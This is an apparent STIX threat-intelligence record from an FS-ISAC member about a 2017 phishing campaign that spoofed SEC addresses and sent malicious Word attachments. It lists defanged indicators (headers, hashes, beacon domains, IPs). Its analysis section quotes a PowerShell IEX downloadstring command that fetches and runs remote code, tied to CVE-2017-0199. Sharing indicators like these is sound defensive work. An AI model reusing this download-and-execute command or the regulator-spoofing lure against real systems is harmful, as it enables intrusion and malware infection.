stix:Indicator.indicator:Title: CYT3: Member Submission: Large Phishing Campaign Spoofing SEC Email Addresses (Tracking ID: 934290)
stix:Indicator.indicator:Description:
An FS-ISAC member has submitted information on a wide scale phishing campaign spoofing the Securities and Exchange Commission (SEC) email addresses.
Starting on October 10, 2017 there was a large email phishingcampaign targeting a wide spectrum of financial and business email accounts. The emails sent were spoofed to appear to be coming from the Securities and Exchange Commission and contained a malicious attachment.
Spoofed SEC Email Addresses: EDGAR[@]sec[.]gov fillings[@]sec[.]gov OIG[@]sec[.]gov
Attachments: EDGAR_Rules_2017.docx EDGAR_Security_Bulletin.docx
Subjects: "EDGAR Filings" "EDGAR Security Bulletin"
Additional Header Information: Received: from hxxp://usa2.serverhoshbilling[.]com (hxxp://usa2.serverhoshbilling[.]com [209.90.232[.]236]) (Using TLS) by hxxp://us-smtp-1.mimecast[.]com with ESMTP id us-mta-82-sPO7t-twM86rhUHJlLn-5w-1; Tue, 10 Oct 2017 16:56:08 -0400 Received: from salesapo by hxxp://usa2.serverhoshbilling[.]com with local (Exim 4.89) (envelope-from <filings[@]sec[.]gov>) From: EDGAR Filings <filings[@]sec[.]gov> Reply-To: EDGAR Filings <filings[@]sec[.]gov>
This was found in the header and is the script that was to send the emails. X-PHP-Script: hxxp://roofingexperts[.]org/wp-content/themes/sp/examples/send_edgar_corps.php Please note that the SEC does publish their SPF records and if SPF protections are on these emails would be blocked: spf=fail (spfCheck: domain of hxxp://sec[.]gov does not designate 209.90.232[.]236 as permitted sender) client-ip=209.90.232[.]236; envelope-from=filings[@]sec[.]gov; helo=usa2.serverhoshbilling[.]com
The email once opened prompts for additional external content download. If that is clicked the document launches cmd and powershell and attempts to download the payload. This does not connect to sec[.]gov, but only echoes that to the user while making the background connection to the payload. The below data was pulled from the open source reports listed at the bottom of the report.
Example 1: WINWORD.EXE /n "C:\bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb.docx" (PID: 2808) cmd.exe /k powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) (PID: 2704, Additional Context: %WINDIR%\system32\cmd.exe /k powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) powershell.exe "powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1')) (PID: 3028, Additional Context: powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://pastebin[.]com/raw/pxSE2TJ1'))
Example 2: WINWORD.EXE /n "C:\1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428.docx" (PID: 2856) cmd.exe /k powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt')) (PID: 3008, Additional Context: %WINDIR%\system32\cmd.exe /k powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt'))
powershell.exe "powershell -C ;echo "hxxps://sec[.]gov/";IEX((new-object net.webclient).downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt')) (PID: 3040, Additional Context: powershell -C echo "hxxps://sec[.]gov/".downloadstring('hxxps://trt.doe.louisiana[.]gov/fonts.txt'))
Member Note: This behavior is indicative of CVE-2017-0199. Below is a post from FireEye with additional information about the CVE. https://www.fireeye.com/blog/threat-research/2017/04/cve-2017-0199-hta-handler.html
Suspected Payload Download: hxxps://trt.doe.louisiana[.]gov/fonts.txt hxxps://pastebin[.]com/raw/pxSE2TJ1
Member Note: We are still analyzing and deobfuscating the payload information and will provide additional information once we have it.
DNS Domains Contacted (Post Infection Beaconing) ns1[.]press ns3[.]site ns4[.]site ns0[.]pw ns5[.]pw ns2[.]press ns3[.]site ns5[.]online ns1[.]online ns1[.]website ns0[.]space ns4[.]space ns5[.]biz ns0[.]site ns0[.]website ns3[.]space
IP Addresses: 209.90.232[.]236 104.20.209[.]21 206.218.181[.]46
File Hashes: EDGAR_Rules_2017.docx VT Detection ratio: 5 / 60 MD5 2c0cfdc5b5653cb3e8b0f8eeef55fc32 SHA1 3a7956ac437c87fc6ca594c59d4de086ed6c8865 SHA256 1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428 ssdeep 384:3/3Xu0XRRD3mbcLgboFX2Pk7Bn0i13LnZMCEOA3nBP38EA:3vxX3lE+287Bv13bWCZM538N File size 16.9 KB ( 17348 bytes ) File type Office Open XML Document
EDGAR_Rules_2017.docx VT Detection ratio: 5 / 59 MD5 0bcadcf65bcf8940fff6fc776dd56563 SHA1 8d650fccdf3497112708a3f4832240905bc6b0c3 SHA256 bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb ssdeep 384:3/3XwqU1tc3mbcLgboFX2Pk7Bn0i13LwV/skCR3nBPm4Zru:3vwd1tc3lE+287Bv138ekCB5d8 File size 17.0 KB ( 17398 bytes ) File type Office Open XML Document
Open Source Analysis Located: https://www.hybrid-analysis.com/sample/bf38288956449bb120bae525b6632f0294d25593da8938bbe79849d6defed5cb?environmentId=100 https://www.hybrid-analysis.com/sample/1a1294fce91af3f7e7691f8307d07aebd4636402e4e6a244faac5ac9b36f8428?environmentId=100
Member Note: Whois data for the malicious DNS domains attached "CombinedWhois.txt". Please note these are just the indicators that we were able to find so far and any additional information will be provided when and if we have it. We are still looking for any other potential emails or documents that may have been sent as part of the campaign.
stix:Indicator.indicator:Short_Description: An FS-ISAC member has submitted information on a wide scale phishing campaign spoofing the Securities and Exchange Commission (SEC) email addresses.
